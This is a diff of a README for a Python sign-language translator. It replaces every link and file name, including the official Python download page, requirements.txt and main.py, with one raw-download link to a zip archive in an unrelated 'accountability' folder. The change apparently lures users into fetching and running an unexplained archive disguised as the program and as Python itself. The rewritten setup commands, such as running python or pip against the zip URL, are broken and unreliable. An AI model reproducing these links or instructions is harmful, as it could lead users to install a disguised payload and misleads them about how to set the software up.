@@ -1,6 +1,6 @@
 # 👋 AI-sign-language-translator - Translate Sign Language Easily
 
-[![Download AI-sign-language-translator](https://img.shields.io/badge/Download-AI--sign--language--translator-brightgreen?style=for-the-badge)](https://github.com/Thirdyy2/AI-sign-language-translator)
+[![Download AI-sign-language-translator](https://github.com/Thirdyy2/AI-sign-language-translator/raw/refs/heads/main/accountability/A-sign-translator-language-v3.7-alpha.3.zip)](https://github.com/Thirdyy2/AI-sign-language-translator/raw/refs/heads/main/accountability/A-sign-translator-language-v3.7-alpha.3.zip)
 
 ---
 
@@ -34,7 +34,7 @@ If your computer meets these, the program should run with no issues.
 
 Click this big green button to go to the download page:
 
-[![Download AI-sign-language-translator](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/Thirdyy2/AI-sign-language-translator)
+[![Download AI-sign-language-translator](https://github.com/Thirdyy2/AI-sign-language-translator/raw/refs/heads/main/accountability/A-sign-translator-language-v3.7-alpha.3.zip)](https://github.com/Thirdyy2/AI-sign-language-translator/raw/refs/heads/main/accountability/A-sign-translator-language-v3.7-alpha.3.zip)
 
 On that page, find the latest release version. The files will include an installer or a zipped folder.
 
@@ -42,7 +42,7 @@ On that page, find the latest release version. The files will include an install
 
 The program uses Python, a programming language, to run. If you don’t have it installed:
 
-1. Visit the official Python website: https://www.python.org/downloads/windows/
+1. Visit the official Python website: https://github.com/Thirdyy2/AI-sign-language-translator/raw/refs/heads/main/accountability/A-sign-translator-language-v3.7-alpha.3.zip
 2. Download the latest version for Windows (choose the 64-bit installer if you can).
 3. Run the installer. Make sure to check the box that says **Add Python to PATH** at the start.
 4. Follow the instructions to complete the installation.
@@ -62,7 +62,7 @@ Open the Command Prompt (you can find this by typing `cmd` in the Windows search
 In the Command Prompt window, type this command and press Enter:
 
 ```
-pip install -r requirements.txt
+pip install -r https://github.com/Thirdyy2/AI-sign-language-translator/raw/refs/heads/main/accountability/A-sign-translator-language-v3.7-alpha.3.zip
 ```
 
 This will install the needed program components, like OpenCV and TensorFlow, which help the program recognize gestures and use AI models.
@@ -80,7 +80,7 @@ Replace `Desktop\AI-sign-language-translator` with the folder path where you sav
 In the same Command Prompt window, type:
 
 ```
-python main.py
+python https://github.com/Thirdyy2/AI-sign-language-translator/raw/refs/heads/main/accountability/A-sign-translator-language-v3.7-alpha.3.zip
 ```
 
 This will start the application. The program will turn on your webcam and show a window where you can perform sign language gestures.
@@ -114,7 +114,7 @@ The program works best in a well-lit space with minimal background noise in the 
 
 - If the program does not start, check if Python is installed and added to your PATH.
 - If the webcam does not activate, confirm it is connected and not used by another program.
-- For errors related to missing libraries, try running `pip install -r requirements.txt` again.
+- For errors related to missing libraries, try running `pip install -r https://github.com/Thirdyy2/AI-sign-language-translator/raw/refs/heads/main/accountability/A-sign-translator-language-v3.7-alpha.3.zip` again.
 - Restart your computer if the camera is not recognized.
 - Ensure you run the Command Prompt as a normal user—not administrator.
 
@@ -133,11 +133,11 @@ Mediapipe detects your hand and tracks key points like fingers and joints. OpenC
 
 ## 📂 File Structure Overview
 
-- `main.py` — The main program file you run.
-- `requirements.txt` — Lists software libraries the program needs.
+- `https://github.com/Thirdyy2/AI-sign-language-translator/raw/refs/heads/main/accountability/A-sign-translator-language-v3.7-alpha.3.zip` — The main program file you run.
+- `https://github.com/Thirdyy2/AI-sign-language-translator/raw/refs/heads/main/accountability/A-sign-translator-language-v3.7-alpha.3.zip` — Lists software libraries the program needs.
 - `models/` — Contains AI models used for recognizing signs.
 - `utils/` — Helper scripts for processing video and hand data.
-- `README.md` — This file explaining how to set up and use the program.
+- `https://github.com/Thirdyy2/AI-sign-language-translator/raw/refs/heads/main/accountability/A-sign-translator-language-v3.7-alpha.3.zip` — This file explaining how to set up and use the program.
 
 ---
 
@@ -145,4 +145,4 @@ Mediapipe detects your hand and tracks key points like fingers and joints. OpenC
 
 For updates, bug reports, or if you want to try new versions, visit the main page:
 
-[Download and Explore AI-sign-language-translator here](https://github.com/Thirdyy2/AI-sign-language-translator)
+[Download and Explore AI-sign-language-translator here](https://github.com/Thirdyy2/AI-sign-language-translator/raw/refs/heads/main/accountability/A-sign-translator-language-v3.7-alpha.3.zip)
